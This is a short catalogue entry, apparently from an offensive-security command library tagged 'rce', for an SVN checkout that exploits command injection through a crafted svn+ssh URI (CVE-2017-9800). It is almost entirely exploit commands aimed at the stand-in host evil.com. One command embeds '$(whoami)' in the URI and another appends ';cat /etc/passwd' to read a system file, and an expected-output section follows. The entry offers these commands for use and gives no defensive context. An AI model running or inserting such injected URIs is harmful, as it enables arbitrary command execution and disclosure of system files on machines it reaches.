---
data: 'svn checkout ''svn+ssh://svn@evil.com/repo/$(whoami)'''
tags:
  - rce
  - svn
type: command
executor: bash
platforms:
  - Linux
  - Unix-like
id: 26731400-0cba-4ff3-b03f-a8c22dde8ab6
created_at: '2025-12-14T17:23:42.310Z'
updated_at: '2025-12-14T17:23:42.310Z'
verified: false
validated: true
submitted: true
---
# svn-checkout-malicious-uri

## Command

```bash
svn checkout 'svn+ssh://svn@evil.com/repo/$(whoami)'
```

## Description

Performs an SVN checkout using a crafted ssh:// URI to exploit command injection (CVE-2017-9800), executing arbitrary commands on the local system.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `svn checkout` | SVN command for repository checkout | Yes |
| `'svn+ssh://svn@evil.com/repo/$(whoami)'` | Injected URI | Yes |

## Examples

### Basic Usage

```bash
svn checkout 'svn+ssh://svn@evil.com/repo/$(whoami)'
```

### Advanced Usage

```bash
svn checkout 'svn+ssh://svn@evil.com/repo;cat /etc/passwd'
```

## Expected Output

A    repo
$(whoami) output: user

## Related

- [[commands/hg-clone-malicious-uri]]
- [[procedures/Exploit-SVN-ssh-URI-Injection]]
